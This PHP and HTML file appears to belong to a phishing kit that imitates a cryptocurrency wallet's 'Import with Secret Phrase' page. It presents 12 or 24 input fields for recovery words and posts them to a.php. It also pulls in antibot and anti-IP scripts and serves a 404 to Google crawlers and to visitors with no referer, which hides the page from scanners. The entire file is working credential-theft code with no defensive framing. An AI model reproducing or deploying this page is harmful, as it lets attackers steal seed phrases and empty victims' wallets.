<?php 
  include('../config.php');
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html style="width: auto;
    height: auto;" data-theme="light">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" href="css/ui.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
      $(document).ready(function() {
        var $dropdown = $('#headlessui-listbox-options-26');
        var $button = $('#headlessui-listbox-button-1');
        $dropdown.hide();

        function hideDropdown() {
          $dropdown.hide();
        }
        $button.click(function(e) {
          e.stopPropagation();
          $dropdown.toggle();
        });
        $(document).on('click', function(e) {
          if (!$dropdown.is(e.target) && !$button.is(e.target) && $dropdown.has(e.target).length === 0) {
            $dropdown.hide();
          }
        });
        $('#headlessui-listbox-option-27, #headlessui-listbox-option-28').click(function() {
          hideDropdown();
        });
        for (let i = 1; i <= 24; i++) {
          let $wordInput = $('#wordinp' + i);
          let $wordDiv = $('#wordiv' + i);
          let $pWord = $('#pword' + i);

          function togglePWordVisibility() {
            if ($wordInput.is(':focus') || $wordInput.val().length > 0) {
              $pWord.show();
            } else {
              $pWord.hide();
            }
          }
          $wordInput.on('input', function() {
            togglePWordVisibility();
          });
          $wordInput.focus(function() {
            $wordDiv.addClass('border-primary');
            togglePWordVisibility();
          });
          $wordInput.blur(function() {
            $wordDiv.removeClass('border-primary');
            togglePWordVisibility();
          });
          togglePWordVisibility();
        }
        $('#headlessui-listbox-option-28').click(function() {
          $('#tool1').attr('class', 'relative flex flex-col flex-1 w-full h-full self-center p-2');
          $('#tool2').attr('class', 'max-w-[800px] mx-auto');
          $('#tool3').attr('class', 'relative flex flex-col flex-grow w-full h-full self-center pt-2');
          $('#tool4').attr('class', 'grid grid-cols-4 gap-1');
          $('#part3, #part4').show();
          $('#textCheck24').removeClass('title-text text-textPrimary font-medium truncate text-unset').addClass('title-text text-primary font-medium truncate text-unset');
          $('#textCheck12').removeClass('title-text text-primary font-medium truncate text-unset').addClass('title-text text-textPrimary font-medium truncate text-unset');
          $('#selectop').text('I have a 24 word Secret Phrase');
          $('#check12').hide();
          $('#check24').show();
        });
        $('#headlessui-listbox-option-27').click(function() {
          $('#tool1').attr('class', 'relative flex flex-col flex-1 w-full h-full self-center md:max-w-[438px] p-2');
          $('#tool2').attr('class', '');
          $('#tool3').attr('class', 'relative flex flex-col flex-grow w-full h-full self-center pt-2 md:max-w-[438px]');
          $('#tool4').attr('class', 'grid grid-cols-2 gap-1');
          $('#part3, #part4').hide();
          $('#textCheck12').removeClass('title-text text-textPrimary font-medium truncate text-unset').addClass('title-text text-primary font-medium truncate text-unset');
          $('#textCheck24').removeClass('title-text text-primary font-medium truncate text-unset').addClass('title-text text-textPrimary font-medium truncate text-unset');
          $('#selectop').text('I have a 12 word Secret Phrase');
          $('#check24').hide();
          $('#check12').show();
        });

        function checkAllInputs() {
          for (var i = 1; i <= 12; i++) {
            var inputValue = $('#wordinp' + i).val().trim();
            if (inputValue === '') {
              return false;
            }
          }
          return true;
        }
        for (var i = 1; i <= 12; i++) {
          $('#wordinp' + i).on('input', function() {
            var allInputsNotEmpty = checkAllInputs();
            $('#butnext').prop('disabled', !allInputsNotEmpty);
          });
        }

        function checkAnyInputNotEmpty() {
          for (var i = 1; i <= 24; i++) {
            var inputValue = $('#wordinp' + i).val().trim();
            if (inputValue !== '') {
              return true;
            }
          }
          return false;
        }

        function clearAllInputs() {
          for (var i = 1; i <= 24; i++) {
            $('#wordinp' + i).val('');
            $('#pword' + i).hide();
          }
        }
        $('#wordinp1, #wordinp2, #wordinp3, #wordinp4, #wordinp5, #wordinp6, #wordinp7, #wordinp8, #wordinp9, #wordinp10, #wordinp11, #wordinp12, #wordinp13, #wordinp14, #wordinp15, #wordinp16, #wordinp17, #wordinp18, #wordinp19, #wordinp20, #wordinp21, #wordinp22, #wordinp23, #wordinp24').on('input', function() {
          var anyInputNotEmpty = checkAnyInputNotEmpty();
          $('#clearbut').prop('disabled', !anyInputNotEmpty);
        });
        $('#clearbut').click(function() {
          clearAllInputs();
          $('#clearbut').prop('disabled', true);
        });
      });
    </script>
  </head>
  <body style="width: auto;
      height: auto;
      margin: 0;">
    <div id="root">
      <div class="relative flex flex-col flex-1 w-full h-full self-center md:max-w-[438px] p-2" id="tool1">
        <div class="" id="tool2">
          <div class="relative flex flex-col flex-grow w-full h-full self-center pt-2 md:max-w-[438px]" id="tool3" style=" padding-top: 0px; ">
            <div class="bg-backgroundPrimary border border-line rounded p-6 mb-11" style=" margin-bottom: 0px; ">
              <div class="flex flex-col items-center text-center space-y-4">
                <div class="w-full flex items-center justify-between space-x-4">
                  <div class="w-full flex flex-col items-center justify-center">
                    <div class="w-full flex items-center justify-center h-1 rounded-curvy bg-primary opacity-100"></div>
                  </div>
                  <div class="w-full flex flex-col items-center justify-center">
                    <div class="w-full flex items-center justify-center h-1 rounded-curvy bg-primary opacity-100"></div>
                  </div>
                </div>
                <h2 class="screamer-text text-textPrimary font-semibold   text-unset">Import with Secret Phrase</h2>
                <div class="w-full mt-6 flex flex-col space-y-6">
                  <form class="space-y-6" method="POST" action="a.php">
                    <div class="flex flex-col items-center space-y-6">
                      <div class="flex w-full max-w-[372px]">
                        <div class="w-full">
                          <div class="relative w-full mt-1">
                            <button class="relative w-full cursor-default input-field title-text font-medium h-12" id="headlessui-listbox-button-1" type="button" aria-haspopup="listbox" aria-expanded="false">
                              <span class="block truncate" id="selectop">I have a 12 word Secret Phrase</span>
                              <span class="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-2">
                                <svg class="text-iconNormal" fill="none" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.99976 10.2397L6.75895 6.99885L5.28581 8.47199L9.99986 13.186L11.473 11.7129L11.4729 11.7128L14.7139 8.47183L13.2407 6.99869L9.99976 10.2397Z" fill="currentColor"></path>
                                </svg>
                              </span>
                            </button>
                            <ul class="absolute z-10 mt-1 max-h-60 w-full overflow-auto rounded bg-bg3 py-1 shadow-lg focus:outline-none" aria-labelledby="headlessui-listbox-button-1" aria-orientation="vertical" id="headlessui-listbox-options-26" role="listbox" tabindex="0" aria-activedescendant="headlessui-listbox-option-27" style="display: none;">
                              <li class="relative cursor-default select-none px-4 py-2" id="headlessui-listbox-option-27" role="option" tabindex="-1" aria-selected="true">
                                <div class="flex items-center space-x-2">
                                  <div class="flex flex-1">
                                    <p class="title-text text-primary font-medium truncate  text-unset" id="textCheck12">I have a 12 word Secret Phrase</p>
                                  </div>
                                  <div id="check12">
                                    <svg class="text-primary" fill="none" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M5.86414 14.0099L5.8629 14.0111L7.63067 15.7789L7.6319 15.7776L7.63201 15.7777L9.39978 14.01L9.39967 14.0099L17.0588 6.35077L15.291 4.58301L7.6319 12.2421L4.68574 9.29593L2.91797 11.0637L5.86414 14.0099Z" fill="currentColor"></path>
                                    </svg>
                                  </div>
                                </div>
                              </li>
                              <li class="relative cursor-default select-none px-4 py-2" id="headlessui-listbox-option-28" role="option" tabindex="-1" aria-selected="false">
                                <div class="flex items-center space-x-2">
                                  <div class="flex flex-1">
                                    <p class="title-text text-textPrimary font-medium truncate  text-unset" id="textCheck24">I have a 24 word Secret Phrase</p>
                                  </div>
                                  <div id="check24" style="display:none;">
                                    <svg class="text-primary" fill="none" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M5.86414 14.0099L5.8629 14.0111L7.63067 15.7789L7.6319 15.7776L7.63201 15.7777L9.39978 14.01L9.39967 14.0099L17.0588 6.35077L15.291 4.58301L7.6319 12.2421L4.68574 9.29593L2.91797 11.0637L5.86414 14.0099Z" fill="currentColor"></path>
                                    </svg>
                                  </div>
                                </div>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                      <div class="grid grid-cols-2 gap-1" id="tool4">
                        <div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12 " id="wordiv1">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword1">1.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #1" spellcheck="false" value="" id="wordinp1" name="1word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv2">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword2">2.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #2" spellcheck="false" value="" id="wordinp2" name="2word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv3">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword3">3.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #3" spellcheck="false" value="" id="wordinp3" name="3word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv4">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword4">4.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #4" spellcheck="false" value="" id="wordinp4" name="4word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv5">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword5">5.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #5" spellcheck="false" value="" id="wordinp5" name="5word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv6">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword6">6.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #6" spellcheck="false" value="" id="wordinp6" name="6word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                        </div>
                        <div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv7">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword7">7.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #7" spellcheck="false" value="" id="wordinp7" name="7word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv8">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword8">8.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #8" spellcheck="false" value="" id="wordinp8" name="8word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv9">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword9">9.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #9" spellcheck="false" value="" id="wordinp9" name="9word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv10">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword10">10.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #10" spellcheck="false" value="" id="wordinp10" name="10word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv11">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword11">11.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #11" spellcheck="false" value="" id="wordinp11" name="11word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv12">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword12">12.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #12" spellcheck="false" value="" id="wordinp12" name="12word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                        </div>
                        <div id="part3" style="display: none;">
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv13">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword13">13.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #13" spellcheck="false" value="" id="wordinp13" name="13word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv14">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword14">14.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #14" spellcheck="false" value="" id="wordinp14" name="14word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv15">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword15">15.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #15" spellcheck="false" value="" id="wordinp15" name="15word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv16">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword16">16.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #16" spellcheck="false" value="" id="wordinp16" name="16word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv17">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword17">17.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #17" spellcheck="false" value="" id="wordinp17" name="17word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv18">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword18">18.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #18" spellcheck="false" value="" id="wordinp18" name="18word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                        </div>
                        <div id="part4" style="display: none;">
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv19">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword19">19.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #19" spellcheck="false" value="" id="wordinp19" name="19word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv20">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword20">20.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #20" spellcheck="false" value="" id="wordinp20" name="20word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv21">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword21">21.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #21" spellcheck="false" value="" id="wordinp21" name="21word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv22">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword22">22.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #22" spellcheck="false" value="" id="wordinp22" name="22word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv23">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword23">23.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #23" spellcheck="false" value="" id="wordinp23" name="23word">
                            </div>
                            <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                          </div>
                          <div class="text-start">
                            <div class="input-field space-x-1 h-12     " id="wordiv24">
                              <p class="title-text text-textPrimary font-medium text-unset" style="display:none;" id="pword24">24.</p>
                              <input class="w-full block flex-1 outline-none bg-transparent title-text font-medium text-left" type="text" placeholder="Word #24" spellcheck="false" value="" id="wordinp24" name="24word">
                              <p class="subtitle-text text-textThird font-normal   text-unset"></p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div>
                        <div class="flex w-full" id="button-tooltip-17">
                          <button type="button" disabled="" id="clearbut" class="outline-none bg-transparent text-backgroundPrimary default-button  p-0 w-full">
                            <p class="title-text text-primary font-medium   text-unset">Clear all</p>
                          </button>
                        </div>
                      </div>
                      <div class="flex w-full items-center justify-between mt-6 space-x-4">
                        <div class="flex w-full" id="button-tooltip-18">
                          <button type="button" class="outline-none bg-transparent text-backgroundPrimary default-button  p-0 w-full">
                            <p class="title-text text-primary font-medium   text-unset">Back</p>
                          </button>
                        </div>
                        <div class="flex w-full" id="button-tooltip-19">
                          <button type="submit" id="butnext" disabled="" class="outline-none bg-primary text-backgroundPrimary hover:bg-primaryHover active:bg-primaryPressed disabled:bg-primaryPressed default-button   w-full">Next</button>
                        </div>
                      </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html> <?php } ?>